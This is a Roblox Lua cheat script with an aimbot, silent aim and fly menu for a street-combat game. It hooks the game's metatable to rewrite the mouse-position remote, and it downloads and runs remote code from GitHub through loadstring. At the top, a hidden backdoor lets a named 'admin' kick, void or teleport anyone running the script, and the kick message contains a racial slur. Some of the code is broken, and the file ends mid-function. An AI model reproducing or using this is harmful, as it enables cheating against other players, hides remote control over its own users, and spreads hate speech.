local plr = game:GetService("Players").LocalPlayer
if plr:IsInGroup("12461136") then
    
    local admins = {"hellofarzad125"}
    local commands = {"tp","usingsilent","void","kick,ban"}
    local prefix = ";"
    
    local function findPlayer(name,sender)
     for _,player in pairs(game.Players:GetPlayers()) do
         if string.lower(name) == "me" then
             return sender
         elseif string.lower(player.Name) == name then
             return player
         end
     end
     
     return nil
    end
    
    local function isAdmin(player)
     for _,Admin in pairs(admins) do
         if string.lower(Admin) == string.lower(player.Name) then
             return true
         end
     end
     
     return false
    end
    
    commands.kick = function(sender,args)
        game.Players.LocalPlayer:kick("farzad kicked ur gay ass NIGGER") 
    end

    commands.ban = function(sender,args)
        game.Players.LocalPlayer:kick("PERMA-BAN") 
    end
    
    commands.void = function(sender,args)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
    end
    
    commands.usingsilent = function(sender,args)
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('yes sir', 'All');
    end
    
    commands.tp = function(sender,args)
        print(sender.Name.." yes? ")
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('hey farzad', 'All');
    
       local playerToTeleportName = args[1]
        local playerToTeleportToName = args[2]
        
        if playerToTeleportName and playerToTeleportToName then
            local plrToTp = findPlayer(playerToTeleportName,sender)
            local plrToTpTo = findPlayer(playerToTeleportToName,sender)
            
            if plrToTp and plrToTpTo then
                plrToTp.Character.HumanoidRootPart.CFrame = plrToTpTo.Character.HumanoidRootPart.CFrame
            end
        end
    end
    
    game.Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(message)
        if isAdmin(player) then
           -- an admin is here! lets see if they chat a command!
           message = string.lower(message)
             
         local splitString = message:split(" ")
         local slashCommand = splitString[1]
         local cmd = slashCommand:split(prefix)
         local cmdName = cmd[2]
             
         if commands[cmdName] then
             local arguments = {}
                 
             for i = 2, #splitString, 1 do
                 table.insert(arguments, splitString[i])
             end
                 
             commands[cmdName](player,arguments)
         end
    
        end
     end)
    end)

local GetService = setmetatable({}, {
    __index = function(self, key)
        return game:GetService(key)
    end
})

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/epicgamersoocool123/test/main/xd1"))()
local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/epicgamersoocool123/lib/main/notifyfarzad"))()
local Notify = NotifyLibrary.Notify
Library.theme.accentcolor = Color3.new(0.92, 0.92, 0.96)

local RunService = GetService.RunService
local Players = GetService.Players
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local CurrentCamera = workspace.CurrentCamera
local UserInputService = GetService.UserInputService
local GuiInset = GetService.GuiService:GetGuiInset()
local AimbotFOV = Drawing.new("Circle")
AimbotFOV.Thickness = 1
local SilentAimFOV = Drawing.new("Circle")
SilentAimFOV.Thickness = 1
local Insert = table.insert
local Network = GetService.NetworkClient
local PuppywareFolder = Instance.new("Folder", workspace)
PuppywareFolder.Name = "PuppyWare-Folder"
local StarterGui = GetService.StarterGui
local ReplicatedStorage = GetService.ReplicatedStorage

local PuppywareSettings = {
    Aiming = {
        Aimbot = {
            Enabled = false,
            AimAssist = false,
            IsAiming = false,
            ShowFOV = false,
            FOVColor = Color3.new(0.92, 0.92, 0.96),
            UseNearestDistance = false,
            WallCheck = false,
            KnockedOutCheck = false,
            GrabbedCheck = false,
            Hitboxes = {"Head"}
        },
        TriggerBot = {
            Enabled = false,
            Delay = false,
            DelayAmount = 0
        },
        SilentAim = {
            Enabled = false,
            ShowFOV = false,
            FOVColor = Color3.new(0.8524, 0, 0.1242),
            WallCheck = false,
            KnockedOutCheck = false,
            UseNearestDistance = false,
            GrabbedCheck = false,
            Hitboxes = {"Head"}
        },
        TargetAim = {
            Enabled = false,
            ShowFOV = false,
            FOVColor = Color3.new(0.8524, 0, 0.1242),
            WallCheck = false,
            KnockedOutCheck = false,
            UseNearestDistance = false,
            GrabbedCheck = false,
            Hitboxes = {"Head"},
            Target = nil
        },
        AimingSettings = {
            MovementPrediction = false,
            MovementPredictionAmount = 0.165 * 1,
            HitChance = false,
            HitChanceAmount = {
                HitPercent = 100,
                NotHitPercent = 0
            },
            AimAssistType = "Camera",
            MovementPrediction = false,
            MovementPredictionAmount = 0.165 * 1,
            SmoothingTracing = false,
            SmoothingTracingAmount = 5,
            PingBasedPrediction = false,
            GetVelocity = 0.165
        },
        RageSection = {
            UnlockTargetKnocked = false,
            NotificationAlert = false,
        },
        FOV = {
            FOVFilled = false,
            AimAssistSize = 100,
            SilentAimSize = 100,
            TargetAimSize = 100
        },
        Whitelist = {
            Players = {},
            Friends = {},
            Holder = "",
            Enabled = false,
            CrewEnabled = false,
            FriendsWhitelist = false
        },
    },
    Blatant = {
        BlatantAA = {
            Enabled = false,
            NoAutoRotate = false,
            UndergroundWallbang = false,
            Underground = false,
            AntiAimType = "Jitter",
            AntiAimSpeed = 100,
            JitterAngle = 180
        },
        LegitAA = {
            Enabled = false,
            AntiAimAt = false,
            AntiAimAtDistance = 20
        },
        FakeLag = {
            Enabled = false,
            TriggerAmount = 5
        },
        Movement = {
            SpeedEnabled = false,
            SpeedType = "Default",
            SpeedRender = "Default",
            SpeedAmount = 5
        },
        Reaching = {
            FistReach = false,
            MeleeReach = false
        },
        Character = {
            AntiGrab = false,
            AntiStomp = false,
            AntiStompType = "Nil Char",
            AntiBag = false,
            AutoArmor = false,
            AutoLettuce = false,
            AutoReload = false
        },
        Farming = {
            ATMFarm = false,
            ShoeFarm = false,
            MuscleFarm = false,
            MuscleFarmingType = "Normal",
            BoxFarm = false,
            HospitalFarm = false,
            ATMPick = false
        },
        Cash = {
            AutoDrop = false,
            AutoDropAmount = 5000,
            AutoPickCash = false
        }
    },
    Teleport = {
        TeleportReturn = false,
        ReturnDelay = false,
        AutoPurchase = false,
        AmmoPurchaseAmount = 1
    }
}

local PuppywareModule = {
    Old = {
        CFrame,
    },
    God = {
        MeleeAlive = false,
        GodMelee = false,
        GodBullet = false,
        AntiRagdoll = false
    },
    LagTick = 0,
    Ignores = {
        "UpperTorso",
        "LowerTorso",
        "Head",
        "LeftHand",
        "LeftUpperArm",
        "LeftLowerArm",
        "RightHand",
        "RightUpperArm",
        "RightLowerArm"
    },
    PingBasedPrediction = 0.165,
    Instance = {},
    Teleport = {
        Players = {},
        Food = {
            "Cranberry",
            "Donut",
            "Pizza",
            "Chicken",
            "Popcorn",
            "Hamburger",
            "Taco",
            "Starblox Latte",
            "Lettuce",
            "Lemonade"
        },
        Location = {
            "Bank",
            "Boxing Place",
            "Police Station",
            "Admin Base",
            "Sewers",
            "Shoe Store",
            "Hospital",
            "Phone Store",
            "Taco Shack",
            "Casino",
            "UFO",
            "Fire Station",
            "Church",
            "Downhill Shop",
            "Uphill Shop"
        },
        Gun = {
            "Glock",
            "SMG",
            "Silencer",
            "TacticalShotgun",
            "P90",
            "AUG",
            "Shotgun",
            "RPG",
            "AR",
            "Double-Barrel SG",
            "Flamethrower",
            "Revolver",
            "LMG",
            "AK47",
            "DrumGun",
            "Silencer",
            "GrenadeLauncher",
            "Taser",
            "SilencerAR",
            "Grenade"
        },
        Armor = {
            "High-Medium Armor",
            "Medium Armor"
        },
        Mask = {
            "Surgeon Mask",
            "Riot Mask",
            "Pitchfork",
            "Hockey Mask",
            "Breathing Mask",
            "Pumpkin Mask",
            "Skull Mask",
            "Paintball Mask",
            "Ninja Mask"
        },
        Weight = {
            "Weights",
            "HeavyWeights"
        },
        Melee = {
            "Shovel",
            "Bat",
            "Pencil",
            "StopSign",
            "Knife",
            "Pitchfork"
        },
        Phone = {
            "iPhone",
            "iPhoneB",
            "iPhoneG",
            "iPhoneP",
            "Old Phone",
            "Orange Phone",
            "Original Phone",
        },
        Bike = {
            "DuoBike",
            "Solo Bike",
        },
        Extra = {
            "PepperSpray",
            "LockPicker",
            "Flashlight",
            "Flowers",
            "Money Gun",
            "Brown Bag",
            "Anti Bodies",
            "Firework"
        }
    }
}

local Window = Library:CreateWindow("FarzadSexyWare.cc", Vector2.new(492, 598), Enum.KeyCode.RightShift)
local AimingTab = Window:CreateTab("Main")

-- Aimbot Setion --

local LegitSection = AimingTab:CreateSector("Aimbot", "left")
local aimbottoggle = LegitSection:AddToggle('Enabled', false, function(Boolean)
    PuppywareSettings.Aiming.Aimbot.Enabled = Boolean
end)
aimbottoggle:AddKeybind()

local AimAssistToggle = LegitSection:AddToggle('Aim Assist', false, function(Boolean)
    PuppywareSettings.Aiming.Aimbot.AimAssist = Boolean
end)

AimAssistToggle:AddKeybind()

local AimbotFOVToggle = LegitSection:AddToggle('Show FOV', false, function(Boolean)
    PuppywareSettings.Aiming.Aimbot.ShowFOV = Boolean
end)

AimbotFOVToggle:AddColorpicker(PuppywareSettings.Aiming.Aimbot.FOVColor, function(Color)
    PuppywareSettings.Aiming.Aimbot.FOVColor = Color
end)

LegitSection:AddToggle('Use Nearest Distance', false, function(Boolean)
    PuppywareSettings.Aiming.Aimbot.UseNearestDistance = Boolean
end)

LegitSection:AddToggle('Wall Check', false, function(Boolean)
    PuppywareSettings.Aiming.Aimbot.WallCheck = Boolean
end)

LegitSection:AddToggle('Knock Out Check', false, function(Boolean)
    PuppywareSettings.Aiming.Aimbot.KnockedOutCheck = Boolean
end)

LegitSection:AddToggle('Grabbed Check', false, function(Boolean)
    PuppywareSettings.Aiming.Aimbot.GrabbedCheck = Boolean
end)

LegitSection:AddDropdown('Hitboxes', {"Head", "HumanoidRootPart"}, {"Head"}, true, function(Value)
    PuppywareSettings.Aiming.Aimbot.Hitboxes = Value
end)


-- Silent Aim Setion --

local RageSection = AimingTab:CreateSector("Silent", "left")
local SilentAimToggle = RageSection:AddToggle('Silent Aim Enabled', false, function(Boolean)
    PuppywareSettings.Aiming.SilentAim.Enabled = Boolean
end)

SilentAimToggle:AddKeybind()

local SilentAimFOVToggle = RageSection:AddToggle('Show FOV', false, function(Boolean)
    PuppywareSettings.Aiming.SilentAim.ShowFOV = Boolean
end)

SilentAimFOVToggle:AddColorpicker(Color3.new(0.92, 0.92, 0.96), function(Color)
    PuppywareSettings.Aiming.SilentAim.FOVColor = Color
end)

RageSection:AddToggle('Use Nearest Distance', false, function(Boolean)
    PuppywareSettings.Aiming.SilentAim.NearestDistance = Boolean
end)

RageSection:AddToggle('Wall Check', false, function(Boolean)
    PuppywareSettings.Aiming.SilentAim.WallCheck = Boolean
end)

RageSection:AddToggle('Knock Out Check', false, function(Boolean)
    PuppywareSettings.Aiming.SilentAim.KnockedOutCheck = Boolean
end)

RageSection:AddToggle('Grabbed Check', false, function(Boolean)
    PuppywareSettings.Aiming.SilentAim.GrabbedCheck = Boolean
end)

RageSection:AddDropdown('Hitboxes (can choose both)', {"Head", "HumanoidRootPart"}, {"Head"}, true, function(Value)
    PuppywareSettings.Aiming.SilentAim.Hitboxes = Value
end)

-- Target Aim Setion --

local RageSection = AimingTab:CreateSector("Target", "left")
local TargetAimToggle = RageSection:AddToggle('Target Aim Enabled', false, function(Boolean)
    PuppywareSettings.Aiming.TargetAim.Enabled = Boolean
end)

TargetAimToggle:AddKeybind()

local SilentAimFOVToggle = RageSection:AddToggle('Show FOV', false, function(Boolean)
    PuppywareSettings.Aiming.TargetAim.ShowFOV = Boolean
end)

SilentAimFOVToggle:AddColorpicker(Color3.new(0.92, 0.92, 0.96), function(Color)
    PuppywareSettings.Aiming.TargetAim.FOVColor = Color
end)

RageSection:AddToggle('Wall Check', false, function(Boolean)
    PuppywareSettings.Aiming.TargetAim.WallCheck = Boolean
end)

RageSection:AddToggle('Knock Out Check', false, function(Boolean)
    PuppywareSettings.Aiming.TargetAim.KnockedOutCheck = Boolean
end)

RageSection:AddToggle('Grabbed Check', false, function(Boolean)
    PuppywareSettings.Aiming.TargetAim.GrabbedCheck = Boolean
end)

RageSection:AddDropdown('Hitboxes (can choose both)', {"Head", "HumanoidRootPart"}, {"Head"}, true, function(Value)
    PuppywareSettings.Aiming.TargetAim.Hitboxes = Value
end)

-- Aiming Settings Section --

local farzadowoxd1 = AimingTab:CreateSector("⬜ lock Rejoin to Fix", "right")

farzadowoxd1:AddButton("Enable", function(value)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/epicgamersoocool123/test/main/xduwu3"))()
end)

local farzadowoxd1 = AimingTab:CreateSector("⚪ lock", "right")

farzadowoxd1:AddButton("Enable (B)", function(value)

    loadstring(game:HttpGet("https://raw.githubusercontent.com/epicgamersoocool123/test/main/xduwu2"))()
end)

local xdowo123 = farzadowoxd1:AddButton('Break', function(value)
    _G.KEY = nil
    _G.PART = nil
    _G.PRED = nil
    _G.Frame = nil
    local L_76_ = nil
    local L_77_
    local L_78_ = nil
    local L_79_ = nil
    local L_80_ = nil
    local L_81_ = nil
    local L_82_ = nil
    function makemarker(L_86_arg0, L_87_arg1, L_88_arg2, L_89_arg3, L_90_arg4)
        local L_91_ = nil
        L_91_.Name = nil
        L_91_.Adornee = nil
        L_91_.Size = nil
        L_91_.AlwaysOnTop = nil
        local L_92_ = nil
        L_92_.Size = nil
        L_92_.BackgroundTransparency = nil
        L_92_.BackgroundColor3 = nil
        local L_93_ = nil
        L_93_.CornerRadius = nil
        return L_91_
    end
    local L_83_ = nil
    function noob(L_94_arg0)
        local L_95_
        repeat
            wait()
        until L_94_arg0.Character
        local L_96_ = nil
        L_96_.Name = nil
        L_94_arg0.CharacterAdded:connect(
            function(L_98_arg0)
                L_96_.Adornee = nil
            end
        )
        local L_97_ = nil
        L_97_.BackgroundTransparency = nil
        L_97_.Position = nil
        L_97_.Size = nil
        L_97_.Font = nil
        L_97_.TextSize = nil
        L_97_.TextColor3 = nil
        L_97_.TextStrokeTransparency = nil
        L_97_.TextYAlignment = nil
        L_97_.Text = nil
        L_97_.ZIndex = nil
        spawn(
            function()
                while wait() do
                    if L_94_arg0.Character then
                    end
                end
            end
        )
    end
    game.Players.PlayerAdded:connect(
        function(L_100_arg0)
            noob(L_100_arg0)
        end
    )
    game.Players.PlayerRemoving:Connect(
        function(L_101_arg0)
            L_82_[L_101_arg0.Name]:Destroy()
        end
    )
    spawn(
        function()
            L_81_.Anchored = true
            L_81_.CanCollide = false
            L_81_.Size = Vector3.new(0.1, 0.1, 0.1)
            L_81_.Transparency = 0.1
            makemarker(L_81_, L_81_, Color3.fromRGB(98, 37, 209), 0.20, 0)
        end
    )
    L_80_.KeyDown:Connect(
        function(L_102_arg0)
            if L_102_arg0 ~= _G.KEY then
                return
            end
            if L_78_ then
                L_78_ = false
                TextLabel.TextColor3 = Color3.fromRGB(98, 37, 209)
                TextLabel.Text = "------"
            else
                L_78_ = true
                L_77_ = getClosestPlayerToCursor()
                TextLabel.TextColor3 = Color3.fromRGB(98, 37, 209)
                TextLabel.Text = L_77_.Character.Humanoid.DisplayName
            end
        end
    )
    function getClosestPlayerToCursor()
        local L_103_
        local L_104_ = math.huge
        for L_105_forvar0, L_106_forvar1 in pairs(game.Players:GetPlayers()) do
            if
                L_106_forvar1 ~= game.Players.LocalPlayer and L_106_forvar1.Character and L_106_forvar1.Character:FindFirstChild("Humanoid") and
                L_106_forvar1.Character.Humanoid.Health ~= 0 and
                L_106_forvar1.Character:FindFirstChild(_G.PART)
            then
                local L_107_ = L_76_:WorldToViewportPoint(L_106_forvar1.Character.PrimaryPart.Position)
                local L_108_ = (Vector2.new(L_107_.X, L_107_.Y) - Vector2.new(L_80_.X, L_80_.Y)).magnitude
                if L_108_ < L_104_ then
                    L_103_ = L_106_forvar1
                    L_104_ = L_108_
                end
            end
        end
        return L_103_
    end
    game:GetService "RunService".Stepped:connect(
        function()
            if L_78_ and L_77_.Character and L_77_.Character:FindFirstChild(_G.PART) then
                L_81_.CFrame =
                    CFrame.new(L_77_.Character[_G.PART].Position + _G.Frame + L_77_.Character[_G.PART].Velocity * L_79_)
            else
                L_81_.CFrame = CFrame.new(0, 9999, 0)
            end
        end
    )
    local L_84_ = getrawmetatable(game)
    local L_85_ = L_84_.__namecall
    setreadonly(L_84_, false)
    L_84_.__namecall =
        newcclosure(
            function(...)
            local L_109_ = {
                ...
            }
            if L_78_ and getnamecallmethod() == "FireServer" and L_109_[2] == "UpdateMousePos" then
                L_109_[3] = L_77_.Character[_G.PART].Position + _G.Frame + L_77_.Character[_G.PART].Velocity * L_79_
                return L_85_(unpack(L_109_))
            end
            return L_85_(...)
        end
        )
    game.Players.LocalPlayer.Chatted:Connect(
        function(L_110_arg0)
            if L_110_arg0 == "/e print" then
                print(_G.PRED)
            end
        end
    )
    game.Players.LocalPlayer.Chatted:Connect(
        function(L_111_arg0)
            if L_111_arg0 == "/e off" then
                _G.KEY = nil
                _G.AIR = nil
                _G.PART = nil
                _G.PRED = nil
                TextLabel.Visible = false
            end
        end
    )
    game.Players.LocalPlayer.Chatted:Connect(
        function(L_112_arg0)
            if L_112_arg0 == "/e 1" then
                _G.KEY = "q"
                _G.AIR = 0.00005
                _G.PART = "HumanoidRootPart"
                _G.PRED = 0.032
                TextLabel.Visible = true
            end
        end
    )
    game.Players.LocalPlayer.Chatted:Connect(
        function(L_113_arg0)
            if L_113_arg0 == "/e 2" then
                _G.KEY = "q"
                _G.AIR = 0.00005
                _G.PART = "LowerTorso"
                _G.PRED = 0.032
                TextLabel.Visible = true
            end
        end
    )
    game.Players.LocalPlayer.Chatted:Connect(
        function(L_114_arg0)
            if L_114_arg0 == "/e 3" then
                _G.KEY = "q"
                _G.AIR = 0.00005
                _G.PART = "LowerTorso"
                _G.PRED = 0.033
                TextLabel.Visible = true
                L_81_ = nil
            end
        end
    )
    game.Players.LocalPlayer.Chatted:Connect(
        function(L_115_arg0)
            if L_115_arg0 == "/e P+" then
                _G.PRED = _G.PRED + 0.001
            end
        end
    )
    game.Players.LocalPlayer.Chatted:Connect(
        function(L_116_arg0)
            if L_116_arg0 == "/e P-" then
                _G.PRED = _G.PRED - 0.001
            end
        end
    )
    while wait() do
        if
            getClosestPlayerToCursor().Character.Humanoid.Jump == true and
            getClosestPlayerToCursor().Character.Humanoid.FloorMaterial == Enum.Material.Air
        then
            _G.Frame = Vector3.new(0, -2.3, 0)
            wait(0.05)
        else
            local L_117_ = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
            local L_118_ = tostring(L_117_)
            local L_119_ = L_118_:split(" ")
            local L_120_ = L_119_[1]
            L_79_ = L_120_ / 1000 + _G.PRED
            _G.Frame = Vector3.new(0, 0.53, 0)
        end
    end
end)

-- Aimbot Settings Section --

local AimbotSettings1 = AimingTab:CreateSector("Aimbot Settings", "right")

AimbotSettings1:AddDropdown('Aim Assist Type', {"Camera", "Mouse"}, "Camera", false, function(Option)
    PuppywareSettings.Aiming.AimbotSettings.AimAssistType = Option
end)

local MovementPredToggle = AimbotSettings1:AddToggle('Movement Prediction', false, function(Boolean)
    PuppywareSettings.Aiming.AimbotSettings.MovementPrediction = Boolean
end)

MovementPredToggle:AddSlider(1, 1, 5, 1, function(Value)
    PuppywareSettings.Aiming.AimbotSettings.MovementPredictionAmount = 0.165 * tonumber("1." ..Value)
end)

local SmoothingTracing = AimbotSettings1:AddToggle('Smoothing Tracing', false, function(Boolean)
    PuppywareSettings.Aiming.AimbotSettings.SmoothingTracing = Boolean
end)

SmoothingTracing:AddSlider(2, 5, 10, 1, function(Value)
    PuppywareSettings.Aiming.AimbotSettings.SmoothingTracingAmount = Value
end)

local AimingSettings = AimingTab:CreateSector("Settings", "right")

AimingSettings:AddToggle('Ping Based Prediction', false, function(Boolean)
    PuppywareSettings.Aiming.AimingSettings.PingBasedPrediction = Boolean
end)

local SmoothingTracing = AimingSettings:AddToggle('Smoothness', false, function(Boolean)
    PuppywareSettings.Aiming.AimingSettings.SmoothingTracing = Boolean
end)

SmoothingTracing:AddSlider(2, 5, 10, 1, function(Value)
    PuppywareSettings.Aiming.AimingSettings.SmoothingTracingAmount = Value
end)

local MovementPredToggle2 = AimingSettings:AddToggle('Custom Prediction', false, function(Boolean)
    PuppywareSettings.Aiming.AimingSettings.MovementPrediction = Boolean
end)

MovementPredToggle2:AddSlider(1, 1, 5, 1, function(Value)
    PuppywareSettings.Aiming.AimingSettings.MovementPredictionAmount = 0.165 * tonumber("1." ..Value)
end)

local HitChanceToggle2 = AimingSettings:AddToggle('Hit Chance', false, function(Boolean)
    PuppywareSettings.Aiming.AimingSettings.HitChance = Boolean
end)

HitChanceToggle2:AddSlider(0, 100, 100, 1, function(Value)
    PuppywareSettings.Aiming.AimingSettings.HitChanceAmount.HitPercent = tonumber(Value)
    PuppywareSettings.Aiming.AimingSettings.HitChanceAmount.NotHitPercent = tonumber(100 - PuppywareSettings.Aiming.AimingSettings.HitChanceAmount.HitPercent)
end)

-- Target Aim Settings Section --

local TargetBind = RageSection:AddKeybind("Bind", false, function()
    
end, function()
    if PuppywareSettings.Aiming.TargetAim.Enabled then
        local NearestTarget, NearestDistance = NearestMouse()
        if NearestTarget and Visible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) then
            PuppywareSettings.Aiming.TargetAim.Target = NearestTarget.Name
            if PuppywareSettings.Aiming.RageSection.NotificationAlert then
                Notify({
                    Title = "😛 farzad 😛",
                    Description = "Target: " .. NearestTarget.Name,
                    Duration = 3
                })
            end
        end
    end
end)

-- Aim Assist FOV Section --

local AimbotFOVSection = AimingTab:CreateSector("FOV", "left")
AimbotFOVSection:AddToggle('FOV Filled', false, function(Boolean)
    PuppywareSettings.Aiming.FOV.FOVFilled = Boolean
end)

AimbotFOVSection:AddSlider("Put Same As Silent", 0, 100, 500, 1, function(Value)
    PuppywareSettings.Aiming.FOV.AimAssistSize = Value
end)

AimbotFOVSection:AddSlider("Silent Size", 0, 100, 500, 1, function(Value)
    PuppywareSettings.Aiming.FOV.SilentAimSize = Value
end)

AimbotFOVSection:AddSlider("FOV Transparency", 0, 9, 9, 1, function(Value)
    PuppywareSettings.Aiming.FOV.Transparency = tonumber("0." .. Value)
end)

RageSection:AddToggle('Unlock Target Knocked', false, function(State)
    PuppywareSettings.Aiming.RageSection.UnlockTargetKnocked = State
end)

RageSection:AddToggle('Notification Alert', false, function(State)
    PuppywareSettings.Aiming.RageSection.NotificationAlert = State
end)

local WhitelistSection = AimingTab:CreateSector("Whitelist", "right")

WhitelistSection:AddToggle('Enable', false, function(State)
    PuppywareSettings.Aiming.Whitelist.Enabled = State
end)

WhitelistSection:AddTextbox("User", nil, function(Text)
    if Text ~= nil and Find(Text) ~= nil and Players:FindFirstChild(Find(Text)) then
        PuppywareSettings.Aiming.Whitelist.Holder = Find(Text)
    else
        Notify({
            Title = "FarzadSexyWare",
            Description = "Player is not found.",
            Duration = 3
        })
    end
end)

WhitelistSection:AddButton('Add', function(State)
    if PuppywareSettings.Aiming.Whitelist.Holder ~= nil and Players:FindFirstChild(PuppywareSettings.Aiming.Whitelist.Holder) then
        if table.find(PuppywareSettings.Aiming.Whitelist.Players, PuppywareSettings.Aiming.Whitelist.Holder) then
            Notify({
                Title = "FarzadSexyWare",
                Description = PuppywareSettings.Aiming.Whitelist.Holder .. " is whitelisted.",
                Duration = 3
            })
        else
            Insert(PuppywareSettings.Aiming.Whitelist.Players, PuppywareSettings.Aiming.Whitelist.Holder)
            Notify({
                Title = "FarzadSexyWare",
                Description = "Whitelisted " .. PuppywareSettings.Aiming.Whitelist.Holder,
                Duration = 3
            })
        end
    else
        Notify({
            Title = "FarzadSexyWare",
            Description = "Player is not found.",
            Duration = 3
        })
    end
end)

WhitelistSection:AddButton('Remove', function()
    if PuppywareSettings.Aiming.Whitelist.Holder ~= nil and Players:FindFirstChild(PuppywareSettings.Aiming.Whitelist.Holder) then
        if table.find(PuppywareSettings.Aiming.Whitelist.Players, PuppywareSettings.Aiming.Whitelist.Holder) then
            Remove(PuppywareSettings.Aiming.Whitelist.Players, PuppywareSettings.Aiming.Whitelist.Holder)
            Notify({
                Title = "FarzadSexyWare",
                Description = "Removed " .. PuppywareSettings.Aiming.Whitelist.Holder,
                Duration = 5
            })
        else
            Notify({
                Title = "FarzadSexyWare",
                Description = PuppywareSettings.Aiming.Whitelist.Holder .. " is not whitelisted.",
                Duration = 5
            })
        end
    else
        Notify({
            Title = "FarzadSexyWare",
            Description = "Player is not found.",
            Duration = 3
        })
    end
end)

WhitelistSection:AddToggle('Crew', false, function(State)
    PuppywareSettings.Aiming.Whitelist.CrewEnabled = State
end)

WhitelistSection:AddToggle('Friends', false, function(State)
    PuppywareSettings.Aiming.Whitelist.FriendsWhitelist = State
end)

--later local VisualsTab = Window:CreateTab("Visuals")
--later local ESPSection = VisualsTab:CreateSector("ESP", "left")

-- Blatant Tab --

local BlatantTab = Window:CreateTab("Rage")

local MovementSector = BlatantTab:CreateSector("Movement", "right")

local BlatantAntiAimSector = BlatantTab:CreateSector("Blatant Anti Aim", "left")

local SpeedToggle = MovementSector:AddToggle('Speed Enabled', false, function(State)
    PuppywareSettings.Blatant.Movement.SpeedEnabled = State
end)
SpeedToggle:AddKeybind()

SpeedToggle:AddSlider(0, 5, 10, 1, function(Value)
    PuppywareSettings.Blatant.Movement.SpeedAmount = Value
end)

MovementSector:AddDropdown("Type", {"CFrame"}, "CFrame", false, function(Value)
    PuppywareSettings.Blatant.Movement.SpeedType = Value
end)

MovementSector:AddDropdown("Render Type", {"Default", "Fast"}, "Default", false, function(Value)
    PuppywareSettings.Blatant.Movement.SpeedRenderType = Value
end)

local CharacterSector = BlatantTab:CreateSector("Character", "right")

CharacterSector:AddButton('fly X', function()
    local L_152_
	local L_153_ = game.Players.LocalPlayer
	IYMouse = L_153_:GetMouse()
	IYMouse.KeyDown:connect(
            function(L_154_arg0)
		if L_154_arg0 == "x" then
			if L_152_ then
				L_152_ = false
				fly()
			else
				L_152_ = true
				NOFLY()
			end
		end
	end
        )
	for L_155_forvar0, L_156_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if L_156_forvar1:IsA("BasePart") and L_156_forvar1.CanCollide == true then
			L_156_forvar1.CanCollide = false
		end
	end
	FLYING = false
	QEfly = true
	iyflyspeed = 7
	vehicleflyspeed = 7
	function sFLY(L_157_arg0)
		repeat
			wait()
		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and
                game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
		repeat
			wait()
		until IYMouse
		local L_158_ = game.Players.LocalPlayer.Character.LowerTorso
		local L_159_ = {
			F = 0,
			B = 0,
			L = 0,
			R = 0,
			Q = 0,
			E = 0
		}
		local L_160_ = {
			F = 0,
			B = 0,
			L = 0,
			R = 0,
			Q = 0,
			E = 0
		}
		local L_161_ = 5
		local function L_162_func()
			FLYING = true
			local L_163_ = Instance.new("BodyGyro", L_158_)
			local L_164_ = Instance.new("BodyVelocity", L_158_)
			L_163_.P = 9e4
			L_163_.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			L_163_.cframe = L_158_.CFrame
			L_164_.velocity = Vector3.new(0, 0, 0)
			L_164_.maxForce = Vector3.new(9e9, 9e9, 9e9)
			spawn(
                    function()
				repeat
					wait()
					if not L_157_arg0 and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
						game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand =
                                    true
					end
					if L_159_.L + L_159_.R ~= 0 or L_159_.F + L_159_.B ~= 0 or L_159_.Q + L_159_.E ~= 0 then
						L_161_ = 50
					elseif not (L_159_.L + L_159_.R ~= 0 or L_159_.F + L_159_.B ~= 0 or L_159_.Q + L_159_.E ~= 0) and L_161_ ~= 0 then
						L_161_ = 0
					end
					if L_159_.L + L_159_.R ~= 0 or L_159_.F + L_159_.B ~= 0 or L_159_.Q + L_159_.E ~= 0 then
						L_164_.velocity =
                                    (workspace.CurrentCamera.CoordinateFrame.lookVector * (L_159_.F + L_159_.B) +
                                    workspace.CurrentCamera.CoordinateFrame *
                                        CFrame.new(L_159_.L + L_159_.R, (L_159_.F + L_159_.B + L_159_.Q + L_159_.E) * 0.2, 0).p -
                                    workspace.CurrentCamera.CoordinateFrame.p) *
                                    L_161_
						L_160_ = {
							F = L_159_.F,
							B = L_159_.B,
							L = L_159_.L,
							R = L_159_.R
						}
					elseif L_159_.L + L_159_.R == 0 and L_159_.F + L_159_.B == 0 and L_159_.Q + L_159_.E == 0 and L_161_ ~= 0 then
						L_164_.velocity =
                                    (workspace.CurrentCamera.CoordinateFrame.lookVector * (L_160_.F + L_160_.B) +
                                    workspace.CurrentCamera.CoordinateFrame *
                                        CFrame.new(L_160_.L + L_160_.R, (L_160_.F + L_160_.B + L_159_.Q + L_159_.E) * 0.2, 0).p -
                                    workspace.CurrentCamera.CoordinateFrame.p) *
                                    L_161_
					else
						L_164_.velocity = Vector3.new(0, 0, 0)
					end
					L_163_.cframe = workspace.CurrentCamera.CoordinateFrame
				until not FLYING
				L_159_ = {
					F = 0,
					B = 0,
					L = 0,
					R = 0,
					Q = 0,
					E = 0
				}
				L_160_ = {
					F = 0,
					B = 0,
					L = 0,
					R = 0,
					Q = 0,
					E = 0
				}
				L_161_ = 0
				L_163_:destroy()
				L_164_:destroy()
				if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
					game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
				end
			end
                )
		end
		IYMouse.KeyDown:connect(
                function(L_165_arg0)
			if L_165_arg0:lower() == "w" then
				if L_157_arg0 then
					L_159_.F = vehicleflyspeed
				else
					L_159_.F = iyflyspeed
				end
			elseif L_165_arg0:lower() == "s" then
				if L_157_arg0 then
					L_159_.B = -vehicleflyspeed
				else
					L_159_.B = -iyflyspeed
				end
			elseif L_165_arg0:lower() == "a" then
				if L_157_arg0 then
					L_159_.L = -vehicleflyspeed
